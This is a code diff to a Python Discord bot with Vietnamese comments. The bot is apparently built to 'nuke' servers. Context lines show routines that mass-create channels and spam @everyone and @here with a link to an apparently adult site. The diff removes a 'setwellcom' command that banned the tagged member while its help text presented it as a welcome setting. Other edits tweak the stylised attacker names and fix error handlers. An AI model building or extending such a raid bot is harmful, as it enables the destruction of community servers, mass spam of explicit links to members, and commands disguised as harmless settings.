@@ -48,7 +48,6 @@ NUKE_AVATAR_URL = "https://i.pinimg.com/736x/06/77/96/0677966604d6b8f84a47fa6672
 
 # ==================== CÔNG THỨC HÀM LẤY EXP CẦN THIẾT ====================
 def get_required_exp(level: int) -> int:
-    # Level càng cao thì EXP cần thiết càng tăng (Ví dụ: Lv1 = 100 EXP, Lv2 = 200 EXP,...)
     return level * 100
 
 # ==================== KHO SPAM (209 CÂU) ====================
@@ -184,11 +183,11 @@ ROAST_LINES = [
 ]
 
 NUKE_CHANNEL_NAMES = [
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
+    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
-    "☠️𝔹𝕆𝕋 ℕ𝕌𝕂𝔼D 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
+    "☠️𝔹𝕆𝕋 ℕ𝕌KEI 𝕃𝔸𝕐 𝕆 ℂℍ𝕆 𝕋𝔸𝕆",
     "☠️𝔼ℤ 𝕋𝕆ℙ 𝔸ℕ𝕋𝕀"
 ]
 
@@ -293,7 +292,7 @@ async def execute_nuke(guild):
         created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
@@ -457,23 +456,16 @@ async def showsv_error(ctx, error):
 # ==================== LỆNH SET CHÀO MỪNG VÀ TẠM BIỆT ====================
 @bot.command(name="setwellcom")
 @is_bot_owner()
-async def set_wellcom(ctx, member: discord.Member = None):
-    # Sửa đổi theo yêu cầu: nuked setwellcom @user sẽ ban người đó ngay lập tức
-    if member is None:
-        await ctx.send("❌ Vui lòng tag người dùng cần ban! Ví dụ: `nuked setwellcom @user`")
-        return
-    try:
-        await member.ban(reason="Bị ban thông qua lệnh setwellcom từ Boss Bảo")
-        await ctx.send(f"🔨 Đã ban thành viên {member.mention} thành công!")
-    except Exception as e:
-        await ctx.send(f"❌ Không thể ban {member.mention}. Lỗi: {str(e)}")
+async def set_wellcom(ctx, channel: discord.TextChannel):
+    WELCOME_CHANNELS[ctx.guild.id] = channel.id
+    await ctx.send(f"✅ Đã thiết lập kênh chào mừng thành công là {channel.mention}")
 
 @set_wellcom.error
 async def set_wellcom_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Cú pháp đúng: `nuked setwellcom @user`")
+        await ctx.send(f"❌ Cú pháp đúng: `nuked setwellcom #kenh`")
 
 @bot.command(name="setgoodbye")
 @is_bot_owner()
@@ -699,7 +691,7 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̶4̸N̷ – HOT WAR BOT(●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
@@ -956,7 +948,7 @@ async def set_server_name_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 @bot.command(name="setservericon")
 @is_bot_owner()
@@ -987,7 +979,7 @@ async def set_server_icon_error(ctx, error):
     if isinstance(error, commands.CheckFailure):
         await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')
     else:
-        await ctx.send(f"❌ Lỗi: {str(e)}")
+        await ctx.send(f"❌ Lỗi: {str(error)}")
 
 # ==================== LỆNH MUTE & UNMUTE ====================
 @bot.command(name="mute")
@@ -1314,7 +1306,7 @@ async def setup(ctx):
             "🔹 **23. `nuked clear`** - Xóa tin nhắn.\n"
             "🔹 **24. `nuked stats`** - Xem thông số server.\n"
             "🔹 **25. `nuked channelslog`** - Cài kênh log sự kiện toàn hệ thống.\n"
-            "🔹 **26. `nuked setwellcom`** - Ban thành viên được tag.\n"
+            "🔹 **26. `nuked setwellcom`** - Cài đặt kênh chào mừng.\n"
             "🔹 **27. `nuked setgoodbye`** - Cài kênh tạm biệt.\n"
             "🔹 **28. `nuked help`** - Trợ giúp."
         ),
@@ -1373,7 +1365,7 @@ async def help_command(ctx):
             "🔹 **23. `nuked clear`** - Xóa số lượng tin nhắn nhanh.\n"
             "🔹 **24. `nuked stats`** - Xem thông số hệ thống server.\n"
             "🔹 **25. `nuked channelslog`** - Thiết lập kênh log sự kiện toàn hệ thống.\n"
-            "🔹 **26. `nuked setwellcom`** - Ban thành viên được tag.\n"
+            "🔹 **26. `nuked setwellcom`** - Cài đặt kênh chào mừng.\n"
             "🔹 **27. `nuked setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
             "🔹 **28. `nuked help`** - Hiển thị bảng hướng dẫn này."
         ),
@@ -1400,13 +1392,9 @@ async def on_message(message):
 
         user_data = USER_LEVELS[guild_id][user_id]
         if user_data["level"] < 670:
-            # Cộng 30 EXP mỗi tin nhắn
             user_data["exp"] += 30
-            
-            # Tính lượng EXP cần để tăng cấp (Càng cao yêu cầu càng nhiều EXP)
             required_exp_for_next = get_required_exp(user_data["level"])
 
-            # Cơ chế lên cấp nhiều cấp liên tục nếu tích đủ EXP
             while user_data["exp"] >= required_exp_for_next and user_data["level"] < 670:
                 user_data["exp"] -= required_exp_for_next
                 user_data["level"] += 1
@@ -1434,7 +1422,6 @@ async def on_message(message):
                 except:
                     pass
                 
-                # Cập nhật mốc EXP mới cho cấp tiếp theo
                 required_exp_for_next = get_required_exp(user_data["level"])
 
     await bot.process_commands(message)
